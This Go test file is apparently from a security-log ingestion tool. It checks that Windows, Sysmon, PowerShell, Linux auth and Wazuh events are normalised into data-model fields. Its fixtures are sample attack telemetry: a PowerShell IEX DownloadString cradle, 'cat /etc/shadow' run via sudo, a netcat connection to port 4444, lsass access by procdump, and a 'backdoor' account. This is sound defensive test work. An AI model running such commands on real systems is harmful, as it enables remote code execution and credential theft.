package ingest

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/jrsamsanchez/signalith/internal/store"
)

var now = time.Date(2026, 10, 11, 12, 0, 0, 0, time.UTC)

func decode(t *testing.T, s string) map[string]any {
	t.Helper()
	var m map[string]any
	dec := json.NewDecoder(strings.NewReader(s))
	dec.UseNumber()
	if err := dec.Decode(&m); err != nil {
		t.Fatal(err)
	}
	return m
}

func expect(t *testing.T, doc map[string]any, want map[string]any) {
	t.Helper()
	for k, v := range want {
		if doc[k] != v {
			t.Errorf("%s = %#v, want %#v", k, doc[k], v)
		}
	}
}

func TestWindowsFailedLogon(t *testing.T) {
	ins := make([]string, 21)
	ins[5], ins[6], ins[7], ins[9], ins[10], ins[12], ins[13], ins[19], ins[20] =
		"administrator", "CORP", "0xC000006D", "0xC000006A", "3", "NTLM", "KALI", "203.0.113.9", "51234"
	ins[4], ins[11], ins[18] = "S-1-0-0", "NtLmSsp ", `C:\Windows\System32\svchost.exe`
	b, _ := json.Marshal(map[string]any{
		"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4625,
		"TimeCreated": "2026-10-11 10:00:00 +0000", "StringInserts": ins, "Message": "An account failed to log on.",
	})
	ev := Normalize("win.security", decode(t, string(b)), now)
	if ev.Model != "Authentication" {
		t.Fatalf("model = %s", ev.Model)
	}
	expect(t, ev.Document(), map[string]any{
		"action": "failure", "user": "administrator", "src": "203.0.113.9", "src_port": int64(51234),
		"logon_type": int64(3), "logon_type_name": "network", "reason": "bad password",
		"logon_process": "NtLmSsp", "user_sid": "S-1-0-0", "process_name": "svchost.exe",
		"host": "DC01.corp.local", "signature_id": "4625", "sourcetype": "WinEventLog:Security",
		"@timestamp": "2026-10-11T10:00:00Z", "datamodel": "Authentication",
	})
}

func TestWindowsProcessCreation(t *testing.T) {
	ins := make([]string, 15)
	ins[1], ins[4], ins[5], ins[8], ins[13] = "bob", "0x1a2c", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "powershell -enc AAA", `C:\Windows\explorer.exe`
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4688", "StringInserts": ins})
	ev := Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Endpoint", "process_name": "powershell.exe", "process": "powershell -enc AAA",
		"process_id": int64(0x1a2c), "parent_process_name": "explorer.exe", "user": "bob",
	})
}

func TestWindowsScheduledTaskCreated(t *testing.T) {
	task := `<?xml version="1.0" encoding="UTF-16"?><Task><Settings><Hidden>true</Hidden></Settings>` +
		`<Actions><Exec><Command>C:\Users\Public\run.exe</Command><Arguments>-u http://x/?a=1&amp;b=2</Arguments></Exec></Actions></Task>`
	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", `\Updater`, task}
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4698", "StringInserts": ins})
	ev := Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Change", "action": "created", "object_category": "scheduled_task", "object": `\Updater`,
		"task_name": `\Updater`, "task_content": task, "user": "bob", "user_domain": "CORP",
		"task_command": `C:\Users\Public\run.exe`, "task_arguments": "-u http://x/?a=1&b=2",
	})
}

func TestWindowsServiceInstalled(t *testing.T) {
	ins := []string{"RemCom Service", `%systemroot%\RemComSvc.exe`, "user mode service", "demand start", "LocalSystem"}
	rec := map[string]any{"Channel": "System", "Computer": "WS1", "EventID": "7045", "ProviderName": "Service Control Manager", "StringInserts": ins}
	b, _ := json.Marshal(rec)
	ev := Normalize("win.events", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Change", "action": "created", "object_category": "service", "object": "RemCom Service",
		"service_name": "RemCom Service", "service_path": `%systemroot%\RemComSvc.exe`, "service_type": "user mode service",
		"service_start_type": "demand start", "service_account": "LocalSystem", "provider": "Service Control Manager",
		"sourcetype": "WinEventLog:System", "signature_id": "7045",
	})
	// Event IDs are their provider's: another provider's 7045 is not a
	// service install.
	rec["ProviderName"] = "Some-Driver"
	b, _ = json.Marshal(rec)
	if ev := Normalize("win.events", decode(t, string(b)), now); ev.Model != "Other" || ev.Fields["provider"] != "Some-Driver" {
		t.Errorf("other provider = %s %v", ev.Model, ev.Fields)
	}
	// Wazuh sends the same event by name.
	alert := `{"timestamp":"2026-10-14T10:00:00.000+0000","rule":{"id":"61138","level":5,"description":"New Windows Service Created"},"agent":{"id":"001","name":"WS1"},` +
		`"data":{"win":{"system":{"providerName":"Service Control Manager","eventID":"7045","channel":"System","computer":"WS1","systemTime":"2026-10-14T10:00:00Z"},` +
		`"eventdata":{"serviceName":"KrbSCM","imagePath":"C:\\Users\\Public\\krb.exe","serviceType":"user mode service","startType":"auto start","accountName":"LocalSystem"}}}}`
	ev, ok := wazuhWindows(decode(t, alert))
	if !ok || ev.Model != "Change" || ev.Fields["service_name"] != "KrbSCM" || ev.Fields["service_path"] != `C:\Users\Public\krb.exe` || ev.Fields["service_start_type"] != "auto start" {
		t.Errorf("wazuh = %v %s %v", ok, ev.Model, ev.Fields)
	}
}

func TestWindowsSecurityServiceInstalled(t *testing.T) {
	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", "PSEXESVC", `%SystemRoot%\PSEXESVC.exe`, "0x10", "3", "LocalSystem"}
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4697", "StringInserts": ins})
	ev := Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Change", "action": "created", "object_category": "service", "object": "PSEXESVC", "user": "bob",
		"service_name": "PSEXESVC", "service_path": `%SystemRoot%\PSEXESVC.exe`, "service_type": "0x10",
		"service_start_type": "3", "service_account": "LocalSystem",
	})
}

func TestWindowsObjectAccess(t *testing.T) {
	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", "Security", "File", `C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State`,
		"0x1f4", "%%4416\n\t\t\t\t", "0x1", "0x1092", `C:\Tools\steal.exe`}
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4663", "StringInserts": ins})
	ev := Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Filesystem", "action": "read", "file_name": "Local State", "object_name": "Local State",
		"object_type": "File", "access_list": "%%4416", "access_mask": "0x1", "process_name": "steal.exe", "process_id": int64(0x1092),
	})
	ins[5], ins[6], ins[8] = "Key", `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`, "%%4432 %%1537"
	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4663", "StringInserts": ins})
	ev = Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Registry", "action": "deleted", "registry_path": `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`,
		"object_path": `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`,
	})
}

func TestSysmonProcessHashes(t *testing.T) {
	msg := "Process Create:\r\nImage: C:\\Users\\bob\\evil.exe\r\nCommandLine: evil.exe\r\nUser: CORP\\bob\r\nHashes: SHA1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,MD5=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB,SHA256=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,IMPHASH=DD"
	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1, "Message": msg})
	ev := Normalize("win.sysmon", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"process_md5": strings.Repeat("b", 32), "process_sha1": strings.Repeat("a", 40), "process_sha256": strings.Repeat("c", 64),
	})
}

// A command line spanning several lines in the rendered message stays whole,
// blank lines included, and the fields after it are still read. (A line
// shaped like "Key: value" ends it: the rendered message cannot tell them
// apart, which is why the OTLP path reads the named values instead.)
func TestSysmonMultiLineCommandLine(t *testing.T) {
	msg := "Process Create:\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nOriginalFileName: Cmd.Exe\r\n" +
		"CommandLine: cmd /c echo one\r\necho two\r\n\r\necho three\r\nCurrentDirectory: C:\\Temp\\\r\n" +
		"User: CORP\\bob\r\nLogonId: 0x3E7\r\nIntegrityLevel: High\r\nParentProcessId: 77\r\nParentUser: CORP\\svc"
	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1, "Message": msg})
	ev := Normalize("win.sysmon", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"process": "cmd /c echo one\necho two\n\necho three", "original_file_name": "Cmd.Exe",
		"process_current_directory": `C:\Temp\`, "logon_id": "0x3E7", "process_integrity_level": "High",
		"parent_process_id": int64(77), "parent_user": `CORP\svc`,
	})
}

func TestSysmonNetwork(t *testing.T) {
	msg := "Network connection detected:\r\nRuleName: -\r\nImage: C:\\Tools\\nc.exe\r\nUser: CORP\\bob\r\nProtocol: tcp\r\nSourceIp: 10.0.0.5\r\nSourcePort: 50000\r\nDestinationIp: 198.51.100.7\r\nDestinationHostname: -\r\nDestinationPort: 4444"
	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 3, "Message": msg})
	ev := Normalize("win.sysmon", decode(t, string(b)), now)
	doc := ev.Document()
	expect(t, doc, map[string]any{
		"datamodel": "Network_Traffic", "dest": "198.51.100.7", "dest_port": int64(4444), "process_name": "nc.exe", "transport": "tcp",
	})
	if _, ok := doc["dest_host"]; ok {
		t.Errorf("dest_host '-' should be dropped")
	}
}

func TestLinuxAuthLines(t *testing.T) {
	cases := []struct {
		line string
		want map[string]any
	}{
		{"Oct 11 09:15:02 web1 sshd[811]: Failed password for invalid user oracle from 192.0.2.4 port 40122 ssh2",
			map[string]any{"datamodel": "Authentication", "action": "failure", "user": "oracle", "src": "192.0.2.4", "reason": "unknown user", "host": "web1", "app": "sshd", "process_id": int64(811)}},
		{"Oct 11 09:15:09 web1 sshd[812]: Accepted publickey for deploy from 192.0.2.10 port 40200 ssh2: RSA SHA256:abc",
			map[string]any{"action": "success", "user": "deploy", "authentication_method": "publickey"}},
		// OpenSSH 9.8 and later (Debian 13, Ubuntu 24.10, Fedora 41, RHEL 10).
		{"Oct 11 09:15:20 web1 sshd-session[1234]: Accepted password for root from 192.0.2.11 port 50000 ssh2",
			map[string]any{"datamodel": "Authentication", "action": "success", "user": "root", "src": "192.0.2.11", "app": "sshd", "process_id": int64(1234)}},
		{"Oct 11 09:15:21 web1 sshd-auth[1235]: Failed password for bob from 192.0.2.11 port 50001 ssh2",
			map[string]any{"datamodel": "Authentication", "action": "failure", "user": "bob", "app": "sshd"}},
		{"Oct 11 09:16:00 web1 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
			map[string]any{"datamodel": "Authentication", "action": "success", "src_user": "alice", "user": "root", "process": "/usr/bin/cat /etc/shadow"}},
		{"Oct 11 09:16:30 web1 sudo:    alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash",
			map[string]any{"action": "failure", "reason": "bad password"}},
		{"Oct 11 09:17:00 web1 useradd[900]: new user: name=backdoor, UID=1002, GID=1002, home=/home/backdoor, shell=/bin/bash",
			map[string]any{"datamodel": "Change", "action": "created", "object": "backdoor"}},
		{"Oct 11 09:18:00 web1 su[901]: pam_unix(su:session): session opened for user root(uid=0) by alice(uid=1000)",
			map[string]any{"datamodel": "Authentication", "action": "success", "user": "root", "src_user": "alice", "app": "su"}},
		{"Oct 11 09:19:00 web1 cron[5]: (root) CMD (run-parts /etc/cron.hourly)",
			map[string]any{"datamodel": "Other", "app": "cron", "sourcetype": "linux:auth"}},
	}
	for _, c := range cases {
		ev := Normalize("linux.auth", map[string]any{"log": c.line}, now)
		doc := ev.Document()
		expect(t, doc, c.want)
		if doc["message"] != c.line {
			t.Errorf("message not preserved for %q", c.line)
		}
		if !strings.HasPrefix(doc["@timestamp"].(string), "2026-10-11T") {
			t.Errorf("timestamp = %v", doc["@timestamp"])
		}
	}
}

func TestJournal(t *testing.T) {
	r := map[string]any{
		"_HOSTNAME": "db1", "SYSLOG_IDENTIFIER": "sshd", "_PID": "77",
		"MESSAGE":              "Failed password for root from 198.51.100.2 port 2222 ssh2",
		"__REALTIME_TIMESTAMP": "1791763200000000",
	}
	doc := Normalize("linux.journal", r, now).Document()
	expect(t, doc, map[string]any{"user": "root", "action": "failure", "host": "db1", "@timestamp": "2026-10-12T00:00:00Z"})
}

func TestUnknownRecordStaysSearchable(t *testing.T) {
	r := decode(t, `{"date": 1791720000.5, "level": "warn", "detail": {"a": 1}}`)
	doc := Normalize("app.custom", r, now).Document()
	expect(t, doc, map[string]any{"datamodel": "Other", "level": "warn", "detail": `{"a":1}`, "@timestamp": "2026-10-11T12:00:00.5Z"})
	if doc["message"] == nil {
		t.Error("message missing")
	}
}

type fakeBulk struct{ docs []store.IndexedDoc }

func (f *fakeBulk) Bulk(_ context.Context, docs []store.IndexedDoc) ([]store.BulkItemError, error) {
	f.docs = append(f.docs, docs...)
	return nil, nil
}

func TestPipelineRoutesToDailyModelIndex(t *testing.T) {
	fb := &fakeBulk{}
	p := &Pipeline{Store: fb, Prefix: "sig", Now: func() time.Time { return now }}
	res, err := p.Ingest(context.Background(), "linux.auth", []map[string]any{
		{"log": "Oct 11 09:15:02 web1 sshd[811]: Failed password for bob from 192.0.2.4 port 1 ssh2"},
		{"log": "not syslog at all"},
	})
	if err != nil || res.Indexed != 2 {
		t.Fatalf("res=%+v err=%v", res, err)
	}
	if fb.docs[0].Index != "sig-authentication-2026.10.11" || fb.docs[1].Index != "sig-other-2026.10.11" {
		t.Errorf("indexes = %s, %s", fb.docs[0].Index, fb.docs[1].Index)
	}
	if s := p.Stats(); s.Received != 2 || s.Indexed != 2 {
		t.Errorf("stats = %+v", s)
	}
}

func TestIngestEvents(t *testing.T) {
	fb := &fakeBulk{}
	p := &Pipeline{Store: fb, Prefix: "sig", Now: func() time.Time { return now }}
	auth := ParseProgram("web1", "sshd", "7", "Failed password for root from 192.0.2.4 port 22 ssh2", "syslog")
	auth.Time = time.Date(2026, 10, 10, 23, 0, 0, 0, time.UTC)
	res, err := p.IngestEvents(context.Background(), []Event{auth, {Fields: map[string]any{"message": "no time, no model"}}})
	if err != nil || res.Indexed != 2 {
		t.Fatalf("res=%+v err=%v", res, err)
	}
	if fb.docs[0].Index != "sig-authentication-2026.10.10" || fb.docs[1].Index != "sig-other-2026.10.11" {
		t.Errorf("indexes = %s, %s", fb.docs[0].Index, fb.docs[1].Index)
	}
	expect(t, fb.docs[1].Doc, map[string]any{"datamodel": "Other", "@timestamp": "2026-10-11T12:00:00Z"})
	if s := p.Stats(); s.Received != 2 || s.Indexed != 2 {
		t.Errorf("stats = %+v", s)
	}
}

func TestGuessYear(t *testing.T) {
	cases := []struct{ stamp, now, want string }{
		{"Oct 11 09:15:02", "2026-10-11T12:00:00Z", "2026-10-11T09:15:02Z"},
		{"Oct 12 11:00:00", "2026-10-11T12:00:00Z", "2026-10-12T11:00:00Z"}, // within a day ahead: clock skew
		{"Dec 31 23:59:59", "2027-01-01T00:00:30Z", "2026-12-31T23:59:59Z"},
	}
	for _, c := range cases {
		st, _ := time.Parse("Jan _2 15:04:05", c.stamp)
		n, _ := time.Parse(time.RFC3339, c.now)
		if got := GuessYear(st, n).Format(time.RFC3339); got != c.want {
			t.Errorf("%s at %s = %s, want %s", c.stamp, c.now, got, c.want)
		}
	}
}

func TestSysmonEventTypes(t *testing.T) {
	sysmon := func(id int, lines ...string) map[string]any {
		b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": id,
			"Message": strings.Join(lines, "\r\n")})
		return Normalize("win.sysmon", decode(t, string(b)), now).Document()
	}
	expect(t, sysmon(7, "Image loaded:", `Image: C:\Users\bob\app.exe`, "ProcessId: 4242", `ImageLoaded: C:\Users\bob\evil.dll`,
		"Description: Evil", "Signed: false", "Signature: -", "SignatureStatus: Unavailable", `User: CORP\bob`), map[string]any{
		"datamodel": "Image_Load", "process_name": "app.exe", "loaded_file_path": `C:\Users\bob\evil.dll`, "loaded_file_name": "evil.dll",
		"signed": "false", "signature_status": "Unavailable", "process_id": int64(4242), "user": `CORP\bob`,
	})
	expect(t, sysmon(10, "Process accessed:", `SourceImage: C:\Tools\procdump.exe`, "SourceProcessId: 77", `TargetImage: C:\Windows\system32\lsass.exe`,
		"TargetProcessId: 640", "GrantedAccess: 0x1410", `CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FFB)`, `SourceUser: CORP\bob`), map[string]any{
		"datamodel": "Endpoint", "signature": "Process accessed", "process_name": "procdump.exe", "target_process_name": "lsass.exe",
		"target_process_id": int64(640), "granted_access": "0x1410", "call_trace": `C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FFB)`,
	})
	expect(t, sysmon(8, "CreateRemoteThread detected:", `SourceImage: C:\Tools\inject.exe`, `TargetImage: C:\Windows\explorer.exe`,
		"StartAddress: 0x00000000025D0000", "StartModule: -", "StartFunction: -"), map[string]any{
		"datamodel": "Endpoint", "signature": "Remote thread created", "target_process_path": `C:\Windows\explorer.exe`, "start_address": "0x00000000025D0000",
	})
	expect(t, sysmon(11, "File created:", `Image: C:\Windows\System32\cmd.exe`, `TargetFilename: C:\Users\bob\AppData\Roaming\run.vbs`), map[string]any{
		"datamodel": "Filesystem", "action": "created", "file_name": "run.vbs", "process_name": "cmd.exe",
	})
	expect(t, sysmon(23, "File Delete archived:", `Image: C:\x.exe`, `TargetFilename: C:\logs\a.log`, "Hashes: SHA256=ABCD"), map[string]any{
		"datamodel": "Filesystem", "action": "deleted", "file_path": `C:\logs\a.log`, "file_hash": "abcd",
	})
	expect(t, sysmon(13, "Registry value set:", "EventType: SetValue", `Image: C:\x.exe`,
		`TargetObject: HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater`, `Details: C:\Users\bob\u.exe`), map[string]any{
		"datamodel": "Registry", "action": "modified", "registry_value_name": "Updater", "registry_key_name": "Run",
		"registry_value_data": `C:\Users\bob\u.exe`,
	})
	expect(t, sysmon(12, "Registry object added or deleted:", "EventType: CreateKey", `TargetObject: HKLM\System\CurrentControlSet\Services\Evil`), map[string]any{
		"datamodel": "Registry", "action": "created", "registry_key_name": "Evil",
	})
	expect(t, sysmon(22, "Dns query:", `Image: C:\x.exe`, "QueryName: bad.example", "QueryStatus: 9003", "QueryResults: -"), map[string]any{
		"datamodel": "Network_Resolution", "query": "bad.example", "reply_code": "NXDomain", "process_name": "x.exe",
	})

	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}})
	expect(t, Normalize("win.powershell", decode(t, string(b)), now).Document(), map[string]any{
		"datamodel": "Script", "script_block_text": "IEX (New-Object Net.WebClient).DownloadString('http://x')",
		"script_block_id": "5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10", "script_part": int64(2), "script_parts": int64(3),
	})
}
